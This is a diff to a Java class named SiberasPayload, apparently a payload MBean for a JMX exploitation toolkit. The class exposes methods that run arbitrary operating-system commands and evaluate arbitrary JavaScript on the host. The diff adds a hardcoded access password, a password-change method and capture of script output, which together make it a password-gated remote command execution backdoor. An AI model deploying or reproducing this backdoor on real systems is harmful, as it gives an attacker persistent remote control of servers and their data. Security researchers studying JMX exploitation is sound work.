@@ -2,14 +2,29 @@ package de.siberas.lab;
 
 import javax.script.ScriptEngineManager;
 import java.io.InputStreamReader;
+import java.io.StringWriter;
+
 import javax.script.ScriptEngine;
 
 public class SiberasPayload implements SiberasPayloadMBean {
+	
+	private String password;
 
+	
+	public SiberasPayload() {
+		password = "I+n33d+a+glass+0f+watta";
+	}
+	
 	@Override
-	public String runCMD(String cmd) {
+	public String runCMD(String passwd, String cmd) {
 
+		
+		if (passwd.equals(this.password) == false)  {
+			return "ERROR: Wrong password";
+		}
+		
 		try {
+			
 			
 			String[] full_cmd;
 
@@ -44,14 +59,39 @@ public class SiberasPayload implements SiberasPayloadMBean {
 	}
 
 	@Override
-	public String runJS(String js) {
-		try {
-			ScriptEngineManager factory = new ScriptEngineManager();
-			ScriptEngine engine = factory.getEngineByName("JavaScript");
-			return (String) engine.eval(js);
-		} catch(Exception ex) {
-			return ex.getMessage();
+	public String runJS(String passwd, String js) {
+		
+		if (passwd.equals(this.password)) {
+			try {
+				StringWriter output =new StringWriter();
+				
+				ScriptEngineManager factory = new ScriptEngineManager();
+				ScriptEngine engine = factory.getEngineByName("JavaScript");
+				engine.getContext().setWriter(output);
+				engine.eval(js);
+				return output.toString();
+			} catch(Exception ex) {
+				return ex.getMessage();
+			}
+			
 		}
+		else {
+			return "ERROR: Wrong password";
+		}
+		
+		
+		
+	}
+
+
+	@Override
+	public boolean changePassword(String oldPass, String newPass) {
+		
+		if (oldPass.equals(this.password)) {
+			this.password = newPass;
+			return true;
+		}
+		return false;
 	}
 
 }
